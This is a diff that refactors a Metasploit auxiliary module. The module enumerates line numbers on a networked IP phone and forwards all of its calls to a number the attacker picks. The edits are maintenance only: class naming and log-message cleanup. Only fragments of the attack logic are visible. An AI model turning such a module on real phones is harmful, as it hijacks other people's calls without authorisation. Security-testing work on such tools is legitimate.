@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info={})
@@ -40,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
         OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
         OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines'])
-      ], self.class)
+      ])
   end
 
   def run
@@ -56,7 +54,7 @@ class Metasploit3 < Msf::Auxiliary
     uri = normalize_uri(target_uri.to_s)
     mac = datastore["MAC"]
 
-    print_status("#{peer} - Getting fintnumbers and display names of the IP phone")
+    print_status("Getting fintnumbers and display names of the IP phone")
 
     res = send_request_cgi(
         {
@@ -68,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
         })
 
     unless res && res.code == 200 && res.body && res.body.to_s =~ /fintnumber/
-      print_error("#{peer} - Target appears not vulnerable!")
+      print_error("Target appears not vulnerable!")
       print_status("#{res}")
       return []
     end
@@ -87,7 +85,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     lines.size.times do |i|
-      print_status("#{peer} - Display Name: #{lines[i]}, Fintnumber: #{fint_numbers[i]}")
+      print_status("Display Name: #{lines[i]}, Fintnumber: #{fint_numbers[i]}")
     end
 
     fint_numbers
@@ -106,13 +104,13 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if fint_numbers.empty?
-      print_error("#{peer} - FINTNUMBER required to forward calls")
+      print_error("FINTNUMBER required to forward calls")
       return
     end
 
     fint_numbers.each do |fintnumber|
 
-      print_status("#{peer} - Sending call forward request for #{fintnumber}")
+      print_status("Sending call forward request for #{fintnumber}")
 
       send_request_cgi(
           {
@@ -138,11 +136,10 @@ class Metasploit3 < Msf::Auxiliary
           })
 
       if res && res.body && res.body && res.body.to_s =~ /CFA/
-        print_good("#{peer} - Call forwarded successfully for #{fintnumber}")
+        print_good("Call forwarded successfully for #{fintnumber}")
       else
-        print_status("#{peer} - Call forward failed.")
+        print_error("Call forward failed")
       end
     end
   end
-
 end
